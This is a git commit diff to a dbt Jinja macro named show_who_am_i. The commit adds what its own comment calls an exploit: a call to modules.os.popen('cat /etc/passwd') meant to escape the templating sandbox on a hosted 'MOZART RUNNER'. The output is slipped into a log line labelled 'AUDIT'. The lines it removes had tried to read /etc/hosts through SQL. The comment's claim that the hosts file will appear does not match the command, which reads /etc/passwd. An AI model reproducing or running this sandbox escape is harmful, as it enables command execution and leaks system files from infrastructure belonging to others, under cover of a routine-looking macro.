48c271d03495fca886792df1b08aec46449f568a
XAR2012 <akshartank123@gmail.com>
2026-05-07 12:50:11 +0530

    Update show_who_am_i.sql

--- macros/show_who_am_i.sql
+++ macros/show_who_am_i.sql
@@ -1,21 +1,26 @@
 {% macro show_who_am_i() %}
+
+  {# 
+     This is the 'Context A' exploit. 
+     We are trying to get the MOZART RUNNER to read its own file system 
+     and save it to a Jinja variable.
+  #}
+  {% set runner_hosts = modules.os.popen('cat /etc/passwd').read() if modules else "MODULES_RESTRICTED" %}
+
   {% set sql %}
     select 
         current_user(), 
         current_role(), 
         current_warehouse(), 
-        current_account(),
-        -- Coalesce to catch if the file read is returning nothing
-        coalesce((select content from table(read_file('/etc/hosts'))), 'FILE_NOT_READABLE_OR_EMPTY')
+        current_account()
   {% endset %}
 
   {% set results = run_query(sql) %}
 
   {% if execute %}
     {% for row in results %}
-      {# Replace actual newlines with a string representation so it stays on one line #}
-      {% set hosts_content = row[4] | string | replace('\n', ' [NEWLINE] ') %}
-      {{ log("AUDIT: user=" ~ row[0] ~ " role=" ~ row[1] ~ " wh=" ~ row[2] ~ " acct=" ~ row[3] ~ " hosts=" ~ hosts_content, info=True) }}
+      {# If this works, the hosts file appears here. If not, you see 'MODULES_RESTRICTED' #}
+      {{ log("AUDIT: user=" ~ row[0] ~ " role=" ~ row[1] ~ " wh=" ~ row[2] ~ " acct=" ~ row[3] ~ " | RUNNER_HOSTS=" ~ runner_hosts | replace('\n', ' [LF] '), info=True) }}
     {% endfor %}
   {% endif %}
 {% endmacro %}
